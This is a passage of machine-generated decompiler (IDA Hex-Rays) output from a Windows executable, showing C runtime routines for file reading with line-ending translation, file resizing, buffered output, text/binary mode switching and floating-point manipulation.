    if ( v22 < 2 && (a2 == 101 || a2 == 69) )
    {
      v16 = v25++;
      *v16 = 48;
    }
    if ( !v22 )
    {
      v17 = v25++;
      *v17 = 48;
    }
    while ( v22 > 0 )
    {
      v18 = v25++;
      *v18 = v21[--v22] + 48;
    }
    *(_DWORD *)(a1 + 36) = &v25[-*(_DWORD *)(a1 + 16) - *(_DWORD *)(a1 + 28)];
  }
  result = *(_WORD *)(a1 + 56) & 0x14;
  if ( result == 16 )
  {
    v22 = *(_DWORD *)(a1 + 36)
        + *(_DWORD *)(a1 + 32)
        + *(_DWORD *)(a1 + 28)
        + *(_DWORD *)(a1 + 20)
        + *(_DWORD *)(a1 + 40);
    result = *(_DWORD *)(a1 + 52);
    if ( v22 < result )
    {
      result = a1;
      *(_DWORD *)(a1 + 24) = *(_DWORD *)(a1 + 52) - v22;
    }
  }
  return result;
}
// 40A98B: variable 'v15' is possibly undefined
// 416440: using guessed type void *off_416440;

//----- (0040AA60) --------------------------------------------------------
DWORD __cdecl sub_40AA60(int a1, _BYTE *a2, DWORD nNumberOfBytesToRead)
{
  int v4; // edi
  char *v5; // eax
  _BYTE *v6; // eax
  DWORD v7; // edi
  _BYTE *v8; // eax
  _BYTE *v9; // eax
  _BYTE *v10; // esi
  _BYTE *v11; // eax
  _BYTE *v12; // eax
  _BYTE *v13; // edx
  _BYTE *v14; // eax
  _BYTE *v15; // eax
  _BYTE *v16; // edx
  _BYTE *v17; // eax
  _BYTE *v18; // eax
  _BYTE *v19; // eax
  _BYTE *v20; // eax
  char Buffer; // [esp+Fh] [ebp-11h] BYREF
  int LastError; // [esp+10h] [ebp-10h]
  LPVOID lpBuffer; // [esp+14h] [ebp-Ch]
  _BYTE *v24; // [esp+18h] [ebp-8h]
  DWORD NumberOfBytesRead; // [esp+1Ch] [ebp-4h] BYREF

  if ( a1 < uNumber && (*((_BYTE *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4) & 1) != 0 )
  {
    v4 = 0;
    lpBuffer = a2;
    if ( nNumberOfBytesToRead && (*((_BYTE *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4) & 2) == 0 )
    {
      v5 = (char *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F);
      if ( (v5[4] & 0x48) != 0 && v5[5] != 10 )
      {
        v6 = lpBuffer;
        lpBuffer = (char *)lpBuffer + 1;
        *v6 = *((_BYTE *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 5);
        v4 = 1;
        --nNumberOfBytesToRead;
        *((_BYTE *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 5) = 10;
      }
      if ( ReadFile(
             *((HANDLE *)*(&lpMem + (a1 >> 5)) + 2 * (a1 & 0x1F)),
             lpBuffer,
             nNumberOfBytesToRead,
             &NumberOfBytesRead,
             0) )
      {
        v7 = NumberOfBytesRead + v4;
        if ( *((char *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4) < 0 )
        {
          if ( NumberOfBytesRead && *a2 == 10 )
          {
            v8 = (char *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4;
            *v8 |= 4u;
          }
          else
          {
            v9 = (char *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4;
            *v9 &= ~4u;
          }
          v24 = a2;
          v10 = a2;
          while ( v10 < &a2[v7] )
          {
            if ( *v10 == 26 )
            {
              if ( (*((_BYTE *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4) & 0x40) == 0 )
              {
                v11 = (char *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4;
                *v11 |= 2u;
              }
              return v24 - a2;
            }
            if ( *v10 == 13 )
            {
              if ( v10 >= &a2[v7 - 1] )
              {
                ++v10;
                LastError = 0;
                if ( !ReadFile(*((HANDLE *)*(&lpMem + (a1 >> 5)) + 2 * (a1 & 0x1F)), &Buffer, 1u, &NumberOfBytesRead, 0) )
                  LastError = GetLastError();
                if ( !LastError && NumberOfBytesRead )
                {
                  if ( (*((_BYTE *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4) & 0x48) != 0 )
                  {
                    v18 = v24++;
                    if ( Buffer == 10 )
                    {
                      *v18 = 10;
                    }
                    else
                    {
                      *v18 = 13;
                      *((_BYTE *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 5) = Buffer;
                    }
                  }
                  else if ( v24 == a2 && Buffer == 10 )
                  {
                    v19 = v24++;
                    *v19 = 10;
                  }
                  else
                  {
                    sub_409FD0(a1, -1, 1u);
                    if ( Buffer != 10 )
                    {
                      v20 = v24++;
                      *v20 = 13;
                    }
                  }
                }
                else
                {
                  v17 = v24++;
                  *v17 = 13;
                }
              }
              else if ( v10[1] == 10 )
              {
                v10 += 2;
                v14 = v24++;
                *v14 = 10;
              }
              else
              {
                v15 = v24++;
                v16 = v10++;
                *v15 = *v16;
              }
            }
            else
            {
              v12 = v24++;
              v13 = v10++;
              *v12 = *v13;
            }
          }
          return v24 - a2;
        }
        return v7;
      }
      else
      {
        LastError = GetLastError();
        if ( LastError == 5 )
        {
          dword_415C84 = 9;
          return -1;
        }
        else if ( LastError == 109 )
        {
          return 0;
        }
        else
        {
          sub_408C30(LastError);
          return -1;
        }
      }
    }
    else
    {
      return 0;
    }
  }
  else
  {
    dword_415C84 = 9;
    return -1;
  }
}
// 415C84: using guessed type int dword_415C84;

//----- (0040ADC0) --------------------------------------------------------
int __usercall sub_40ADC0@<eax>(LONG a1@<edi>, int a2@<esi>, int a3, LONG a4)
{
  int v5; // esi
  int v6; // eax
  void *v7; // eax
  BOOL v8; // eax
  int v9; // [esp-10h] [ebp-14h]
  LONG v10; // [esp-Ch] [ebp-10h]
  int v11; // [esp-8h] [ebp-Ch]
  int v12; // [esp-4h] [ebp-8h]
  int v13; // [esp+0h] [ebp-4h] BYREF

  sub_404730(0x1014u);
  v11 = a2;
  v10 = a1;
  v12 = 0;
  if ( a3 < uNumber && (*((_BYTE *)*(&lpMem + (a3 >> 5)) + 8 * (a3 & 0x1F) + 4) & 1) != 0 )
  {
    v10 = sub_409FD0(a3, 0, 1u);
    if ( v10 == -1 )
      return -1;
    v11 = sub_409FD0(a3, 0, 2u);
    if ( v11 == -1 )
    {
      return -1;
    }
    else
    {
      v5 = a4 - v11;
      if ( a4 - v11 <= 0 )
      {
        if ( v5 < 0 )
        {
          sub_409FD0(a3, a4, 0);
          v7 = (void *)sub_408B00(a3);
          v8 = SetEndOfFile(v7);
          v12 = v8 - 1;
          if ( !v8 )
            dword_415C84 = 13;
        }
      }
      else
      {
        memset(&v13 - 1028, 0, 0x1000u);
        v9 = sub_40B330(a3, 0x8000);
        while ( 1 )
        {
          *(&v13 - 1029) = (unsigned int)v5 < 0x1000 ? v5 : 4096;
          v6 = sub_4086D0(a3, (_BYTE *)&v13 - 4112, *(&v13 - 1029));
          if ( v6 == -1 )
            break;
          v5 -= v6;
          if ( v5 <= 0 )
            goto LABEL_17;
        }
        if ( GetLastError() == 5 )
          dword_415C84 = 13;
        v12 = -1;
LABEL_17:
        sub_40B330(a3, v9);
      }
      sub_409FD0(a3, v10, 0);
      return v12;
    }
  }
  else
  {
    dword_415C84 = 9;
    return -1;
  }
}
// 40ADC0: could not find valid save-restore pair for ebx
// 40ADC0: could not find valid save-restore pair for edi
// 40ADC0: could not find valid save-restore pair for esi
// 415C84: using guessed type int dword_415C84;

//----- (0040AF40) --------------------------------------------------------
int __cdecl sub_40AF40(_BYTE *a1, int a2)
{
  int v4; // eax
  int v5; // edi
  unsigned int v6; // [esp-10h] [ebp-14h]
  _BYTE *v7; // [esp-Ch] [ebp-10h]
  _BYTE *v8; // [esp-4h] [ebp-8h]

  while ( *a1 )
  {
    if ( *(_DWORD *)(a2 + 16) >= *(_DWORD *)(a2 + 24) && sub_408570(a2) < 0 )
      return -1;
    if ( (*(_WORD *)a2 & 0x400) != 0 )
      v7 = sub_40B400(a1, 10);
    else
      v7 = 0;
    v8 = v7;
    if ( v7 )
    {
      v6 = v7 - a1 + 1;
    }
    else
    {
      v4 = -1;
      do
        ++v4;
      while ( a1[v4] );
      v6 = v4;
    }
    v5 = v6;
    if ( *(_DWORD *)(a2 + 24) - *(_DWORD *)(a2 + 16) < v6 )
    {
      v8 = 0;
      v5 = *(_DWORD *)(a2 + 24) - *(_DWORD *)(a2 + 16);
    }
    sub_404EE0(*(_BYTE **)(a2 + 16), a1, v5);
    a1 += v5;
    *(_DWORD *)(a2 + 16) += v5;
    if ( v8 && sub_405C10(a2) )
      return -1;
  }
  if ( (*(_WORD *)a2 & 0x800) != 0 && sub_405C10(a2) )
    return -1;
  if ( (*(_WORD *)a2 & 0xC00) != 0 )
    *(_DWORD *)(a2 + 24) = *(_DWORD *)(a2 + 16);
  return 0;
}

//----- (0040B040) --------------------------------------------------------
int __cdecl sub_40B040(_WORD *a1, unsigned __int16 *a2)
{
  int v2; // esi

  v2 = (a2[3] & 0x7FF0) >> 4;
  if ( (_WORD)v2 == 2047 )
  {
    *a1 = 0;
    if ( (a2[3] & 0xF) != 0 || a2[2] || a2[1] || *a2 )
      return 2;
    else
      return 1;
  }
  else if ( (__int16)v2 <= 0 && (LOWORD(v2) = sub_40B430(a2), (__int16)v2 > 0) )
  {
    *a1 = 0;
    return 0;
  }
  else
  {
    a2[3] = a2[3] & 0x800F | 0x3FE0;
    *a1 = v2 - 1022;
    return -1;
  }
}

//----- (0040B0E0) --------------------------------------------------------
int __cdecl sub_40B0E0(unsigned __int16 *a1, int a2)
{
  int v2; // esi
  int result; // eax
  unsigned int v5; // kr00_4
  double v6; // [esp+20h] [ebp-8h]
  __int16 i; // [esp+24h] [ebp-4h]
  __int16 v8; // [esp+24h] [ebp-4h]
  unsigned __int16 v9; // [esp+26h] [ebp-2h]
  int v10; // [esp+34h] [ebp+Ch]
  int v11; // [esp+34h] [ebp+Ch]

  v2 = (a1[3] & 0x7FF0) >> 4;
  if ( (_WORD)v2 == 2047 )
  {
    if ( (a1[3] & 0xF) != 0 || a1[2] || a1[1] || *a1 )
      return 2;
    else
      return 1;
  }
  else if ( (_WORD)v2 || (LOWORD(v2) = sub_40B430(a1), (__int16)v2 <= 0) )
  {
    v10 = a2 + (__int16)v2;
    if ( v10 < 2047 )
    {
      if ( v10 <= 0 )
      {
        v9 = a1[3] & 0x8000;
        a1[3] = a1[3] & 0xF | 0x10;
        v11 = v10 - 1;
        if ( v11 >= -52 )
        {
          for ( i = v11; i <= -16; i += 16 )
          {
            *a1 = a1[1];
            a1[1] = a1[2];
            a1[2] = a1[3];
            a1[3] = 0;
          }
          v8 = -i;
          if ( v8 )
          {
            *a1 = (a1[1] << (16 - v8)) | ((int)*a1 >> v8);
            a1[1] = (a1[2] << (16 - v8)) | ((int)a1[1] >> v8);
            a1[2] = (a1[3] << (16 - v8)) | ((int)a1[2] >> v8);
            a1[3] = (int)a1[3] >> v8;
          }
          a1[3] |= v9;
          return -1;
        }
        else
        {
          a1[3] = v9;
          a1[2] = 0;
          a1[1] = 0;
          *a1 = 0;
          return 0;
        }
      }
      else
      {
        a1[3] = (16 * v10) | a1[3] & 0x800F;
        return -1;
      }
    }
    else
    {
      if ( (a1[3] & 0x8000u) == 0 )
        v6 = dbl_41644C;
      else
        v6 = -dbl_41644C;
      *(double *)a1 = v6;
      v5 = __readeflags();
      result = 1;
      __writeeflags(v5);
    }
  }
  else
  {
    return 0;
  }
  return result;
}
// 41644C: using guessed type double dbl_41644C;

//----- (0040B300) --------------------------------------------------------
int __cdecl sub_40B300(int a1, int a2)
{
  return a1 / a2;
}

//----- (0040B330) --------------------------------------------------------
int __cdecl sub_40B330(int a1, int a2)
{
  int v3; // ecx
  _BYTE *v4; // eax
  _BYTE *v5; // eax

  if ( a1 >= uNumber || (*((_BYTE *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4) & 1) == 0 )
  {
    dword_415C84 = 9;
    return -1;
  }
  v3 = *((_BYTE *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4) & 0x80;
  if ( a2 == 0x8000 )
  {
    v4 = (char *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4;
    *v4 &= ~0x80u;
  }
  else
  {
    if ( a2 != 0x4000 )
    {
      dword_415C84 = 22;
      return -1;
    }
    v5 = (char *)*(&lpMem + (a1 >> 5)) + 8 * (a1 & 0x1F) + 4;
    *v5 |= 0x80u;
  }
  return v3 != 0 ? 0x4000 : 0x8000;
}
// 415C84: using guessed type int dword_415C84;

//----- (0040B400) --------------------------------------------------------
_BYTE *__cdecl sub_40B400(_BYTE *a1, char a2)
{
  _BYTE *v3; // ecx

  v3 = 0;
  while ( 1 )
  {
    if ( *a1 == a2 )
      v3 = a1;
    if ( !*a1 )
      break;
    ++a1;
  }
  return v3;
}

//----- (0040B430) --------------------------------------------------------
int __cdecl sub_40B430(unsigned __int16 *a1)
{
  __int16 v1; // cx
  __int16 v2; // si
  unsigned __int16 v3; // ax

  v1 = a1[3] & 0x8000;
  v2 = 1;
  v3 = a1[3] & 0xF;
  a1[3] = v3;
  if ( v3 || a1[2] || a1[1] || *a1 )
  {
    while ( !a1[3] )
    {
      a1[3] = a1[2];
      a1[2] = a1[1];
      a1[1] = *a1;
      *a1 = 0;
      v2 -= 16;
    }
    while ( a1[3] < 0x10u )
    {
      a1[3] = ((int)a1[2] >> 15) | (2 * a1[3]);
      a1[2] = ((int)a1[1] >> 15) | (2 * a1[2]);
      a1[1] = ((int)*a1 >> 15) | (2 * a1[1]);
      *a1 *= 2;
      --v2;
    }
    while ( a1[3] >= 0x20u )
    {
      *a1 = (a1[1] << 15) | ((int)*a1 >> 1);
      a1[1] = (a1[2] << 15) | ((int)a1[1] >> 1);
      a1[2] = (a1[3] << 15) | ((int)a1[2] >> 1);
      a1[3] = (int)a1[3] >> 1;
      ++v2;
    }
    a1[3] &= 0xFu;
  }
  a1[3] |= v1;
  return v2;
}

// nfuncs=204 queued=187 decompiled=187 lumina nreq=0 worse=0 better=0
// ALL OK, 187 function(s) have been successfully decompiled
